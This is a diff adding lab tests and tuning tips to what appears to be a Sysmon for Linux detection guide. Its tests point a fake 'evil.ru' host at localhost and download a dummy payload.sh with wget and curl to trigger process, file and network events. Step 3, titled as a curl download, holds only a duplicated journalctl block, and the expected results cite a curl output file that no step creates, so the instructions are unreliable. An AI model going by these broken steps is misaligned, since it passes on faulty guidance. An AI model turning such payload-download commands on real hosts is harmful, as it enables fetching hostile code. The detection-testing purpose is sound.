@@ -113,3 +113,72 @@ On many distros Sysmon for Linux logs to journald (tag sysmon) and/or /var/log/s
 
 ## Lab tests (offline-safe)
 In all tests below, Sysmon should emit **EventID 1** (Process Create) and **EventID 11** (File Create) when applicable. **EventID 3** (Network Connect) may also appear if ```DestinationHostname``` is captured.
+
+**A) HTTP test with fake suspicious TLD**
+
+**1. Map a fake TLD to localhost:**
+```bash
+echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
+```
+**2. Serve a file locally:**
+```bash
+mkdir -p ~/webroot && cd ~/webroot
+echo 'echo "malicious payload"' > payload.sh
+python3 -m http.server 8000 &
+```
+**3. Download with curl (should fire ProcessCreate and FileCreate rules):**
+```bash
+# All recent Sysmon events
+journalctl -t sysmon -S "5 minutes ago"
+
+# Grep for event types (format varies by build)
+journalctl -t sysmon -S "5 minutes ago" | egrep -i "EventID=1|EventID=3|EventID=11|Process Create|Network connection|File Create"
+```
+**4. Download with wget (same expectation):**
+```bash
+wget http://evil.ru:8000/payload.sh -O /tmp/payload2.sh
+```
+**5. Inspect Sysmon events:**
+```bash
+# All recent Sysmon events
+journalctl -t sysmon -S "5 minutes ago"
+
+# Grep for event types (format varies by build)
+journalctl -t sysmon -S "5 minutes ago" | egrep -i "EventID=1|EventID=3|EventID=11|Process Create|Network connection|File Create"
+```
+**Expected clues:**
+
+- EID 1 with Image=/.../curl or /.../wget and CommandLine containing evil.ru and /payload.sh.
+
+- EID 3 with DestinationHostname=evil.ru (if captured).
+
+- EID 11 with Image=/.../curl or /.../wget and TargetFilename=/tmp/payload.sh (or your chosen output).
+
+**B) HTTPS test (best-effort)**
+
+You can still simulate HTTPS locally; Sysmon won’t see SNI, but ProcessCreate will still show the URL:
+```bash
+# self-signed cert server
+mkdir ~/tls-test && cd ~/tls-test
+openssl genrsa -out evil.key 2048
+openssl req -new -x509 -key evil.key -out evil.crt -days 365 -subj "/CN=evil.ru"
+openssl s_server -key evil.key -cert evil.crt -accept 8443 -www &
+# client
+curl -vk https://evil.ru:8443/
+journalctl -t sysmon -S "2 minutes ago" | grep -i "evil.ru" -n
+```
+You should see EID 1 with the full ```CommandLine``` including ```https://evil.ru:8443/```. EID 3 may show ```DestinationHostname=evil.ru``` depending on how your build populates it.
+
+## Tuning ideas
+
+- Reduce noise: If devs commonly use .zip from .top, split the “risky extension” rules into a separate, lower-priority bucket or exclude known-good hosts:
+```xml
+<!-- Example exclusion (put in a ProcessCreate onmatch="exclude" block in your main config) -->
+<ProcessCreate onmatch="exclude">
+  <CommandLine condition="contains any">.top/</CommandLine>
+  <CommandLine condition="contains any">company-artifacts.top/</CommandLine>
+</ProcessCreate>
+```
+- Directories: For FileCreate, add normalizers in your SIEM to only alert when ```TargetFilename``` is under ```/home```, ```/tmp```, ```/var/tmp```, ```/opt, etc```.
+
+- Complementary controls: Pair with your Suricata HTTP rules (User-Agent + TLD + extension) and Linux auditd rules to cross-validate behavior and cut FPs.
